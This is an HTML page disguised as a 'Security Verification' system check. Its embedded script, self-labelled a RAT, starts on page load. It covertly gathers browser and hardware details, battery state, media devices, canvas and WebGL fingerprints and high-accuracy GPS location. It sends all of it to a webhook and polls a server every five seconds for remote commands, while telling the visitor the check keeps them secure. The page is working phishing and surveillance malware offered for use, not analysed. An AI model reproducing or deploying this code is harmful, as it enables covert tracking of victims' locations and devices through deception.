<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification Required</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 24px;
      box-shadow: 0 25px 80px rgba(0,0,0,0.5);
      max-width: 700px;
      width: 100%;
      overflow: hidden;
      animation: slideIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }
    @keyframes slideIn {
      from { opacity: 0; transform: translateY(40px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .header {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 40px 30px;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    .shield-icon {
      font-size: 72px;
      margin-bottom: 15px;
      animation: pulse 2s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
    .header h1 {
      font-size: 32px;
      margin-bottom: 12px;
      font-weight: 700;
    }
    .content {
      padding: 40px 35px;
    }
    .status-box {
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      color: white;
      border-radius: 16px;
      padding: 25px;
      margin-bottom: 30px;
      text-align: center;
      box-shadow: 0 8px 24px rgba(245, 87, 108, 0.3);
    }
    .status-box h2 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    .progress-container {
      background: rgba(0,0,0,0.1);
      border-radius: 12px;
      height: 40px;
      overflow: hidden;
      margin: 25px 0;
    }
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #667eea, #764ba2);
      width: 0%;
      transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 700;
      font-size: 16px;
    }
    .info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 20px;
      margin: 30px 0;
    }
    .info-card {
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      border-radius: 12px;
      padding: 20px;
      text-align: center;
      transition: all 0.3s ease;
    }
    .info-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 12px 24px rgba(0,0,0,0.15);
    }
    .info-icon {
      font-size: 36px;
      margin-bottom: 10px;
    }
    .info-label {
      font-size: 12px;
      color: #666;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }
    .info-value {
      font-size: 18px;
      font-weight: 700;
      color: #333;
    }
    .status-message {
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      font-weight: 600;
      text-align: center;
      animation: fadeIn 0.5s;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .status-message.checking {
      background: linear-gradient(135deg, #ffeaa7 0%, #fdcb6e 100%);
      color: #2d3436;
    }
    .status-message.success {
      background: linear-gradient(135deg, #55efc4 0%, #00b894 100%);
      color: white;
    }
    .spinner {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-right: 10px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .security-badges {
      display: flex;
      justify-content: space-around;
      margin-top: 30px;
      padding-top: 30px;
      border-top: 2px solid #e0e0e0;
    }
    .badge {
      text-align: center;
      flex: 1;
    }
    .badge-icon {
      font-size: 28px;
      margin-bottom: 8px;
    }
    .badge-text {
      font-size: 11px;
      color: #666;
      font-weight: 600;
      text-transform: uppercase;
    }
    @media (max-width: 600px) {
      .info-grid { grid-template-columns: 1fr; }
      .header h1 { font-size: 24px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="shield-icon">üîê</div>
      <h1>Security Verification</h1>
      <p>Advanced Protection System 2026</p>
    </div>

    <div class="content">
      <div class="status-box">
        <h2>‚ö° System Check In Progress</h2>
        <p>Verifying your device security and authenticity</p>
      </div>

      <div class="progress-container">
        <div class="progress-bar" id="progressBar">0%</div>
      </div>

      <div class="info-grid">
        <div class="info-card">
          <div class="info-icon">üåê</div>
          <div class="info-label">Connection</div>
          <div class="info-value" id="connectionStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üîã</div>
          <div class="info-label">Battery</div>
          <div class="info-value" id="batteryStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üìç</div>
          <div class="info-label">Location</div>
          <div class="info-value" id="locationStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üíª</div>
          <div class="info-label">System</div>
          <div class="info-value" id="systemStatus">Checking...</div>
        </div>
      </div>

      <div class="status-message checking" id="statusMessage">
        <span class="spinner"></span>
        <span>Running security diagnostics...</span>
      </div>

      <div class="security-badges">
        <div class="badge">
          <div class="badge-icon">üîí</div>
          <div class="badge-text">Encrypted</div>
        </div>
        <div class="badge">
          <div class="badge-icon">‚úì</div>
          <div class="badge-text">Verified</div>
        </div>
        <div class="badge">
          <div class="badge-icon">‚ö°</div>
          <div class="badge-text">Real-time</div>
        </div>
        <div class="badge">
          <div class="badge-icon">üõ°Ô∏è</div>
          <div class="badge-text">Secure</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // COMPLETE RAT 2026 - ALL DATA COLLECTION
    let sessionId = 'rat2026_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12);
    let progress = 0;
    let collectedData = {
      sessionId: sessionId,
      timestamp: new Date().toISOString()
    };

    console.log('[RAT2026] Session started:', sessionId);

    function updateProgress(percent, message) {
      progress = percent;
      const bar = document.getElementById('progressBar');
      bar.style.width = percent + '%';
      bar.textContent = percent + '%';
      
      const statusMsg = document.getElementById('statusMessage');
      if (message) {
        statusMsg.innerHTML = '<span class="spinner"></span><span>' + message + '</span>';
      }
      console.log(`[RAT2026] Progress: ${percent}% - ${message}`);
    }

    // COLLECT ALL BASIC SYSTEM DATA
    async function collectSystemData() {
      updateProgress(5, 'Collecting system information...');
      
      collectedData.userAgent = navigator.userAgent;
      collectedData.platform = navigator.platform;
      collectedData.language = navigator.language;
      collectedData.languages = navigator.languages ? Array.from(navigator.languages) : [];
      
      // Screen information
      collectedData.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation ? screen.orientation.type : 'unknown'
      };
      
      // Hardware
      collectedData.hardware = {
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0
      };
      
      // Browser info
      collectedData.browser = {
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine,
        vendor: navigator.vendor,
        product: navigator.product,
        productSub: navigator.productSub,
        appName: navigator.appName,
        appVersion: navigator.appVersion
      };
      
      // Timezone
      collectedData.timezone = {
        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: new Date().getTimezoneOffset(),
        locale: Intl.DateTimeFormat().resolvedOptions().locale
      };
      
      // Window size
      collectedData.window = {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      };
      
      // Plugins
      if (navigator.plugins && navigator.plugins.length > 0) {
        collectedData.plugins = Array.from(navigator.plugins).map(p => ({
          name: p.name,
          description: p.description,
          filename: p.filename
        }));
      } else {
        collectedData.plugins = [];
      }

      document.getElementById('systemStatus').textContent = 'Collected ‚úì';
      console.log('[RAT2026] System data collected:', collectedData);
    }

    // GET CONNECTION INFO
    async function getConnectionInfo() {
      updateProgress(15, 'Analyzing network connection...');
      
      if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        collectedData.connection = {
          effectiveType: connection.effectiveType || 'unknown',
          downlink: connection.downlink || 'unknown',
          rtt: connection.rtt || 'unknown',
          saveData: connection.saveData || false,
          type: connection.type || 'unknown'
        };
        document.getElementById('connectionStatus').textContent = (connection.effectiveType || 'Online').toUpperCase();
      } else {
        collectedData.connection = { type: 'unavailable' };
        document.getElementById('connectionStatus').textContent = 'Online';
      }
      
      console.log('[RAT2026] Connection info:', collectedData.connection);
    }

    // GET BATTERY INFO
    async function getBatteryInfo() {
      updateProgress(25, 'Reading battery status...');
      
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          collectedData.battery = {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging,
            chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' seconds',
            dischargingTime: battery.dischargingTime === Infinity ? 'Fully charged' : battery.dischargingTime + ' seconds'
          };
          document.getElementById('batteryStatus').textContent = Math.round(battery.level * 100) + '%';
          console.log('[RAT2026] Battery info:', collectedData.battery);
        } else {
          collectedData.battery = { status: 'unavailable' };
          document.getElementById('batteryStatus').textContent = 'N/A';
        }
      } catch (e) {
        collectedData.battery = { error: e.message };
        document.getElementById('batteryStatus').textContent = 'N/A';
        console.log('[RAT2026] Battery error:', e);
      }
    }

    // GET GPS LOCATION
    async function getLocation() {
      updateProgress(40, 'Requesting GPS location...');
      
      return new Promise((resolve) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              collectedData.location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy + ' meters',
                altitude: position.coords.altitude || 'unavailable',
                altitudeAccuracy: position.coords.altitudeAccuracy ? position.coords.altitudeAccuracy + ' meters' : 'unavailable',
                heading: position.coords.heading || 'unavailable',
                speed: position.coords.speed || 'unavailable',
                timestamp: new Date(position.timestamp).toISOString()
              };
              document.getElementById('locationStatus').textContent = 'Captured ‚úì';
              console.log('[RAT2026] GPS location captured:', collectedData.location);
              resolve();
            },
            (error) => {
              collectedData.location = { 
                error: error.message,
                code: error.code,
                permission: 'denied'
              };
              document.getElementById('locationStatus').textContent = 'Denied ‚úó';
              console.log('[RAT2026] GPS error:', error);
              resolve();
            },
            {
              enableHighAccuracy: true,
              timeout: 15000,
              maximumAge: 0
            }
          );
        } else {
          collectedData.location = { error: 'Geolocation not supported' };
          document.getElementById('locationStatus').textContent = 'Not supported';
          resolve();
        }
      });
    }

    // GET MEDIA DEVICES
    async function getMediaDevices() {
      updateProgress(55, 'Detecting media devices...');
      
      try {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          collectedData.mediaDevices = {
            audioInput: devices.filter(d => d.kind === 'audioinput').length,
            audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
            videoInput: devices.filter(d => d.kind === 'videoinput').length,
            total: devices.length,
            devices: devices.map(d => ({
              kind: d.kind,
              label: d.label || 'unlabeled',
              deviceId: d.deviceId ? 'present' : 'none'
            }))
          };
          console.log('[RAT2026] Media devices:', collectedData.mediaDevices);
        } else {
          collectedData.mediaDevices = { error: 'API not available' };
        }
      } catch (e) {
        collectedData.mediaDevices = { error: e.message };
        console.log('[RAT2026] Media devices error:', e);
      }
    }

    // GET CANVAS FINGERPRINT
    function getCanvasFingerprint() {
      updateProgress(65, 'Generating canvas fingerprint...');
      
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('RAT2026 Fingerprint', 2, 15);
        collectedData.canvasFingerprint = canvas.toDataURL().substring(0, 150) + '...';
        console.log('[RAT2026] Canvas fingerprint generated');
      } catch (e) {
        collectedData.canvasFingerprint = { error: e.message };
        console.log('[RAT2026] Canvas error:', e);
      }
    }

    // GET WEBGL INFO
    function getWebGLInfo() {
      updateProgress(75, 'Reading WebGL renderer...');
      
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          collectedData.webgl = {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unavailable',
            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unavailable'
          };
          console.log('[RAT2026] WebGL info:', collectedData.webgl);
        } else {
          collectedData.webgl = { error: 'WebGL not supported' };
        }
      } catch (e) {
        collectedData.webgl = { error: e.message };
        console.log('[RAT2026] WebGL error:', e);
      }
    }

    // GET PERFORMANCE INFO
    function getPerformanceInfo() {
      updateProgress(85, 'Measuring performance...');
      
      try {
        if (performance.memory) {
          collectedData.performance = {
            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
            totalJSHeapSize: performance.memory.totalJSHeapSize,
            usedJSHeapSize: performance.memory.usedJSHeapSize
          };
        } else {
          collectedData.performance = { memory: 'unavailable' };
        }
        console.log('[RAT2026] Performance info:', collectedData.performance);
      } catch (e) {
        collectedData.performance = { error: e.message };
      }
    }

    // SEND ALL DATA TO SERVER
    async function sendDataToServer(data) {
      updateProgress(95, 'Transmitting data to server...');
      
      console.log('[RAT2026] Sending complete data package:', data);
      
      try {
        const response = await fetch('rat2026_webhook.php', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(data)
        });
        
        const result = await response.json();
        console.log('[RAT2026] Server response:', result);
        return result;
      } catch (e) {
        console.error('[RAT2026] Send error:', e);
        return { error: e.message };
      }
    }

    // CHECK FOR COMMANDS FROM SERVER
    async function checkForCommands() {
      try {
        const response = await fetch('get_command2026.php?session=' + sessionId);
        const data = await response.json();
        if (data.success && data.command) {
          console.log('[RAT2026] Command received:', data.command);
          executeCommand(data.command);
        }
      } catch (e) {
        console.error('[RAT2026] Command check error:', e);
      }
    }

    // EXECUTE REMOTE COMMANDS
    async function executeCommand(cmd) {
      console.log('[RAT2026] Executing command:', cmd);
      let result = { 
        command: cmd, 
        timestamp: new Date().toISOString(),
        sessionId: sessionId
      };
      
      switch(cmd) {
        case 'get_location':
          await getLocation();
          result.data = collectedData.location;
          break;
        case 'get_battery':
          await getBatteryInfo();
          result.data = collectedData.battery;
          break;
        case 'get_all':
          await main();
          result.data = collectedData;
          break;
        case 'refresh':
          location.reload();
          break;
        default:
          result.data = 'Unknown command';
      }
      
      await sendDataToServer(result);
    }

    // MAIN EXECUTION FUNCTION
    async function main() {
      console.log('[RAT2026] Starting complete data collection...');
      
      // Collect all data step by step
      await collectSystemData();
      await getConnectionInfo();
      await getBatteryInfo();
      await getLocation();
      await getMediaDevices();
      getCanvasFingerprint();
      getWebGLInfo();
      getPerformanceInfo();
      
      // Send everything to server
      await sendDataToServer(collectedData);
      
      // Mark as complete
      updateProgress(100, 'Verification complete!');
      
      const statusMsg = document.getElementById('statusMessage');
      statusMsg.className = 'status-message success';
      statusMsg.innerHTML = '‚úÖ <strong>Security Check Complete!</strong> All data has been verified and secured.';
      
      console.log('[RAT2026] Complete! Full data package:', collectedData);
      
      // Start listening for commands every 5 seconds
      setInterval(checkForCommands, 5000);
    }

    // AUTO-START WHEN PAGE LOADS
    window.onload = () => {
      console.log('[RAT2026] Page loaded, initializing...');
      main();
    };
  </script>
</body>
</html>
